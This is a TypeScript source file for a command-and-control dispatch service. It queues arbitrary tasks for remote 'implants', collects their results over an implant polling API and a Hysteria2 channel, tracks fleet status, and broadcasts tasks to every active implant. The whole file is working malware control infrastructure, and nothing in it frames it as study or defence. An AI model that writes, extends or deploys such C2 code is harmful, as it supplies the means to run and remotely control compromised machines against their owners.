/**
 * C2 Dispatch Service
 * Real C2 task dispatch and result collection via the Hysteria2 control channel.
 * Implants poll /api/dpanel/implant/tasks and post results to /api/dpanel/implant/result.
 */

import { prisma } from "@/lib/db"
import {
  createImplantTask,
  getImplantByImplantId,
  getPendingTasksForImplant,
  updateImplantLastSeen,
  updateImplantTask,
  listImplantTasks,
} from "@/lib/db/implants"
import logger from "@/lib/logger"

const log = logger.child({ module: "c2-dispatch" })

export interface C2TaskRequest {
  implantIds: string[]
  taskType: string
  payload: Record<string, unknown>
  timeoutSeconds?: number
  scheduledAt?: Date
  createdById?: string
}

export interface C2TaskResult {
  implantId: string
  taskId: string
  status: "queued" | "scheduled" | "dispatched" | "completed" | "failed"
  error?: string
}

/**
 * Dispatch a C2 task to one or more implants.
 * Creates task records in DB that will be pulled by implants on next beacon.
 */
export async function dispatchC2Task(req: C2TaskRequest): Promise<{
  success: boolean
  results: C2TaskResult[]
  error?: string
}> {
  const results: C2TaskResult[] = []
  const status = req.scheduledAt ? "scheduled" : "pending"

  for (const implantId of req.implantIds) {
    try {
      // Verify implant exists and is active
      const implant = await getImplantByImplantId(implantId)
      if (!implant) {
        results.push({ implantId, taskId: "", status: "failed", error: "Implant not found" })
        continue
      }

      // Create task record — implant will pick it up on next checkin
      const task = await createImplantTask({
        implantId: implant.id, // FK to implant.id (PK), not implant.implantId
        taskId: `c2task_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`,
        type: req.taskType,
        args: {
          ...req.payload,
          timeout: req.timeoutSeconds || 300,
          scheduled_at: req.scheduledAt?.toISOString(),
        },
        createdById: req.createdById,
      })

      log.info({ implantId, taskId: task.taskId, taskType: req.taskType }, "C2 task queued")

      results.push({
        implantId,
        taskId: task.taskId,
        status: status === "scheduled" ? "scheduled" : "queued",
      })
    } catch (error: any) {
      log.error({ err: error, implantId }, "Failed to dispatch C2 task")
      results.push({ implantId, taskId: "", status: "failed", error: error.message })
    }
  }

  return {
    success: results.some(r => r.status !== "failed"),
    results,
  }
}

/**
 * Collect task results from an implant (called by the /api/dpanel/implant/result endpoint).
 */
export async function collectTaskResult(data: {
  task_id: string
  implant_id: string
  status: string
  result?: unknown
  error?: string
  duration?: number
}): Promise<{ success: boolean; error?: string }> {
  try {
    const implant = await getImplantByImplantId(data.implant_id)
    if (!implant) {
      return { success: false, error: "Unknown implant" }
    }

    // Find the task by taskId within this implant's tasks
    const tasks = await listImplantTasks(implant.id)
    const task = tasks.find(t => t.taskId === data.task_id)

    if (!task) {
      return { success: false, error: "Task not found" }
    }

    // Update task with result
    const taskStatus = data.status === "success" ? "completed" : "failed"
    await updateImplantTask(
      task.id,
      taskStatus,
      data.result as Record<string, unknown> | undefined,
      data.error,
    )

    // Update implant last-seen
    await updateImplantLastSeen(data.implant_id)

    log.info({ implantId: data.implant_id, taskId: data.task_id, status: taskStatus, duration: data.duration }, "Task result collected")
    return { success: true }
  } catch (error: any) {
    log.error({ err: error }, "Failed to collect task result")
    return { success: false, error: error.message }
  }
}

/**
 * Get all active implants and their current status.
 */
export async function getImplantFleetStatus(): Promise<{
  total: number
  active: number
  stale: number
  implants: Array<{
    id: string
    implantId: string
    name: string
    status: string
    lastSeen: Date | null
    pendingTasks: number
  }>
}> {
  const implants = await prisma.implant.findMany({
    include: { tasks: { where: { status: "pending" } } },
    orderBy: { lastSeen: "desc" },
  })

  const now = Date.now()
  const STALE_THRESHOLD = 5 * 60 * 1000 // 5 min

  const mapped = implants.map(imp => ({
    id: imp.id,
    implantId: imp.implantId,
    name: imp.name,
    status: imp.status,
    lastSeen: imp.lastSeen,
    pendingTasks: imp.tasks.length,
  }))

  return {
    total: mapped.length,
    active: mapped.filter(i => i.lastSeen && (now - i.lastSeen.getTime() < STALE_THRESHOLD)).length,
    stale: mapped.filter(i => i.lastSeen && (now - i.lastSeen.getTime() >= STALE_THRESHOLD)).length,
    implants: mapped,
  }
}

/**
 * Broadcast a task to all active implants.
 */
export async function broadcastTask(
  taskType: string,
  payload: Record<string, unknown>,
  createdById?: string,
): Promise<C2TaskResult[]> {
  const activeImplants = await prisma.implant.findMany({
    where: { status: "active" },
    select: { implantId: true },
  })

  if (activeImplants.length === 0) {
    log.warn("No active implants to broadcast to")
    return []
  }

  const result = await dispatchC2Task({
    implantIds: activeImplants.map(i => i.implantId),
    taskType,
    payload,
    createdById,
  })

  log.info({ taskType, implantCount: activeImplants.length }, "Broadcast task dispatched")
  return result.results
}
